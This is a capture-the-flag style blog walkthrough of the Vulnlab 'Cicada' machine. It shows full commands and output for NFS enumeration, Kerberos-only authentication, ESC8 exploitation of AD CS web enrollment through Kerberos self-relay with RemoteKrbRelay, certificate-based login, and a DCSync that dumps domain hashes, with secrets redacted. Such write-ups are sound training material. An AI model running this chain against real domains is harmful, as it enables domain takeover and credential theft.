---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2024-09-29-vl-cicada
tags:
- active directory
- kerberos
title: VL Cicada
---

Cicada is a medium-difficulty machine on Vulnlab that involves exploiting ESC8 via Kerberos relaying in order to bypass self-relay restrictions.

## Enumeration

Port scan:

```terminal
Nmap scan report for 10.10.104.125
Host is up (0.025s latency).
Not shown: 984 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-04 08:51:28Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

We see that we are dealing with a domain controller, that there is a web server on port 80 and that there is NFS running. Let's check out NFS first.

```terminal
showmount -e 10.10.104.125

Export list for 10.10.104.125:
/profiles (everyone)
```

We mount the directory to check the contents and eventually find some images:

```terminal
mkdir share
sudo mount -t nfs -o rw,vers=4 10.10.104.125:/profiles $PWD/share

ls -lahR share | grep -B5 png

share/Administrator:
total 1,5M
drwxrwxrwx 2 nobody nogroup   64 Sep 15 15:25 .
drwxrwxrwx 2 nobody nogroup 4,0K Sep 15 15:18 ..
drwx------ 2 nobody nogroup   64 Sep 15 15:25 Documents
-rwxrwxrwx 1 nobody nogroup 1,5M Sep 13 18:12 vacation.png

share/Rosie.Powell:
total 1,8M
drwxrwxrwx 2 nobody nogroup   64 Sep 15 15:25 .
drwxrwxrwx 2 nobody nogroup 4,0K Sep 15 15:18 ..
drwx------ 2 nobody nogroup   64 Sep 15 15:25 Documents
-rwx------ 1 nobody nogroup 1,8M Sep 13 18:09 marketing.png
```

After downloading the images, we find one is of an employee that has a note with a password on their desk. We try to authenticate with the credentials:

```terminal
nxc smb 10.10.104.125 -u 'rosie.powell' -p '***'
SMB         10.10.104.125   445    10.10.104.125    [*]  x64 (name:10.10.104.125) (domain:10.10.104.125) (signing:True) (SMBv1:False)
SMB         10.10.104.125   445    10.10.104.125    [-] 10.10.104.125\rosie.powell:*** STATUS_NOT_SUPPORTED
```

This shows `STATUS_NOT_SUPPORTED` which is the case because NTLM is not enabled on this domain. In order to get around this, we can authenticate with Kerberos instead (which needs the FQDN instead of the IP, so you will need to add it your hosts file or use the machines DNS server):

```terminal
nxc smb dc-jpq225.cicada.vl -u 'rosie.powell' -p '***' -k
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\rosie.powell:***
```

Now the credentials show as valid. At this point we can do some more enumeration like collecting bloodhound data, looking at shares and manually going through LDAP. In this case, it won't really help though. 

The web server on port 80 has just the default IIS page, but if we check `/certsrv/` we note that this is the endpoint for the ADCS web enrollment. Without checking the web server, you'd also get this information from certipy:

```terminal
getTGT.py cicada.vl/rosie.powell:'***' -dc-ip 10.10.104.125
export KRB5CCNAME=rosie.powell.ccache

certipy find -k -no-pass -ns 10.10.104.125 -debug -dc-ip dc-jpq225.cicada.vl
...
[*] Saved text output to '20241004135207_Certipy.txt'
[*] Saved JSON output to '20241004135207_Certipy.json'

cat 20241004135207_Certipy.txt
...
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 66D35978EDC54F9A492AC71194832260
    Certificate Validity Start          : 2024-10-04 08:43:06+00:00
    Certificate Validity End            : 2524-10-04 08:53:06+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
...
```

If the web enrollment is active and no extra mitigation steps have been taken, it can be exploited by relaying the authentication of a privileged machine (for example a domain controller) to it. This is a pretty common vulnerability and widely known as ESC8. Usually this needs at least 2 machines, where you would relay a domain controller via your own attacker controlled machine to the web endpoint on the CA. Relaying back to the same machine shouldn't be possible due to self-relay mitigations that have been introduced quite a while ago.

[Recent research](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html) has shown, that it is still possible to do in this case by relaying Kerberos instead of NTLM.

The attack has been automated in [KrbRemoteRelay](https://github.com/CICADA8-Research/RemoteKrbRelay) by Cicada8 Research (hence the name of the machine). Since this runs on Windows and we only have one target machine available, we'll use a Windows VM to perform the attack.

Since the machine account quota is 10, you could domain join your own Windows VM to run it, but it's also sufficient to get a TGT & RPCSS TGS, inject it on a non-domain joined windows machine and then run the tool.

For the domain joined way, connect to the VPN and then make sure to set the DNS entry to the Cicada DC. It's important to keep IPv6 enabled in the adapter or enable if its not yet the case.

Then join the machine to the domain using the credentials of Rosie Powell. After a restart, you can run the tool to get a certificate for the domain controller:

```
RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3

                            /\_/\____,
                  ,___/\_/\ \  ~     /
                  \     ~  \ )   XXX
                    XXX     /    /\_/\___,
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)
[+] Setting UP Rogue COM at port 12345
[+] Registering...
[+] Register success
[+] Forcing Authentication
[+] Using CLSID: d99e6e74-fc88-11d0-b498-00a0c90312f3
[*] apReq: 6082071f06...
[+] Got Krb Auth from NT/System. Relaying to ADCS now...
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, Confidentiality, UseDceStyle, Connection
[+] Received Kerberos Auth from dc-jpq225.cicada.vl with ticket on http/dc-jpq225.cicada.vl
[*] apRep2: 6f5b305...
[+] HTTP session established
[+] Cookie ASPSESSIONIDSSDRDQTA=IHPNGIODCGPMFFNKEE...; path=/
[+] Lets get certificate for "cicada.vl\dc-jpq225$" using "DomainController" template
[+] Success (ReqID: 17)
[+] Certificate in PKCS12: MIACAQ...
```

Save the resulting base64-encoded certificate on your Linux VM and swap back the VPN:

```
echo -ne "MIACAQ..." | base64 -d > cert.p12
```

Now we can authenticate via PKINIT:

```
certipy auth -pfx cert.p12 -dc-ip 10.10.104.125 -domain cicada.vl
export KRB5CCNAME=dc-jpq225.ccache

[*] Using principal: dc-jpq225$@cicada.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:***
```

We use the resulting ticket to perform a dcsync attack:

```
export KRB5CCNAME=dc-jpq225.ccache
secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@cicada.vl@dc-jpq225.cicada.vl -just-dc

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0...
```

Finally you can get a ticket for the administrator user and then WinRM to the machine to read the flag.

If you want to do it without the domain join, you need to still run the VPN on Windows, setup the DNS and then request a TGT and a service ticket for RPCSS (otherwise you'd get "The RPC server is unavailable"):

```
Rubeus.exe asktgt /user:rosie.powell /domain:cicada.vl /password:*** /dc:10.10.104.125 /ptt /nowrap

Rubeus.exe asktgs /service:RPCSS/dc-jpq225.cicada.vl /dc:10.10.104.125 /ptt /ticket:doI...
...
klist

#0>     Client: rosie.powell @ CICADA.VL
        Server: krbtgt/cicada.vl @ CICADA.VL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 10/4/2024 4:48:38 (local)
        End Time:   10/4/2024 14:48:38 (local)
        Renew Time: 10/11/2024 4:48:38 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: rosie.powell @ CICADA.VL
        Server: RPCSS/dc-jpq225.cicada.vl @ CICADA.VL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 10/4/2024 4:48:56 (local)
        End Time:   10/4/2024 14:48:38 (local)
        Renew Time: 10/11/2024 4:48:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```